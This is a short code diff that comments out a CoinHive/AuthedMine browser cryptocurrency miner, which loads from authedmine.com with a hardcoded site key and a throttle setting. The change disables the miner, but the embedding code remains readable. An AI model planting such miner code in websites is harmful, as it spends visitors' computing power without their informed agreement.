@@ -1,6 +1,6 @@
 //coinhive
 
-<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+/*<script src="https://authedmine.com/lib/authedmine.min.js"></script>
 <script>
 	var miner = new CoinHive.Anonymous('DFCcPijCwA91sHip2a2ag6m4T26rQFzk', {throttle: 0.3});
 
@@ -10,7 +10,7 @@
 		miner.start();
 	}
 </script>
-
+*/
 function main() {
 
 (function () {
